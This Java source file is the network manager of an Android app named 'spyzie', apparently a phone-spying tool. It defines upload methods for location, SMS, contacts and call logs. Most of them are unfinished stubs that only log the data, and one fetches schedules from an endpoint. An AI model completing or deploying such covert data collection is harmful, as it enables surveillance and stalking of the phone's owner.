package com.tantd.spyzie.data.network;

import android.content.Context;
import android.util.Log;

import com.rx2androidnetworking.Rx2AndroidNetworking;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.JsonUtil;

import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 8/21/2017.
 */
public class AppApiManager implements ApiManager {

    private Context mContext;

    private static final String DEBUG_SUB_TAG = "[" + AppApiManager.class.getSimpleName() + "] ";

    private static AppApiManager instance;

    public static synchronized AppApiManager getInstance() {
        if (instance == null) {
            instance = new AppApiManager();
        }
        return instance;
    }

    private AppApiManager() {
        mContext = SpyzieApplication.getInstance();
    }

    @Override
    public Single<List<Event>> getSchedules() {
        return Rx2AndroidNetworking.get(ApiEndPoint.ENDPOINT_SCHEDULES)
                .build().getObjectListSingle(Event.class);
    }

    @Override
    public void sendLocationData(Location location) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, lat=" + location.lat + ", lon=" + location.lon);
        }
    }

    @Override
    public void sendLocationData(List<Location> locations) {
        String json = JsonUtil.getInstance().toJson(locations);
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "sendLocationData, size=" + locations.size());
            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "sendLocationData, json=" + json);
        }
        if (Constants.IS_API_ACIVE) {

        } else {

        }
    }

    @Override
    public void sendSmsData(Sms sms) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData: " + sms.toString());
        }
        // TODO: implement here
    }

    @Override
    public void sendSmsData(List<Sms> sms) {

    }

    @Override
    public void sendExceptionTracking(Error error) {
        // TODO: implement here
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendExceptionTracking, error=" + error + ", errorValue=" + error.ordinal());
        }
    }

    @Override
    public void sendContactsData(List<Contact> contacts) {
        // TODO: implement here
        printContacts(contacts);
    }

    @Override
    public void sendCallsData(List<Call> calls) {
        // TODO: implement here
        print(calls);
    }

    private <T> void print(List<T> objects) {
        for (T t :
                objects) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + t);
        }
    }

    private void printContacts(List<Contact> contacts) {
        for (Contact contact :
                contacts) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + contact);
        }
    }
}
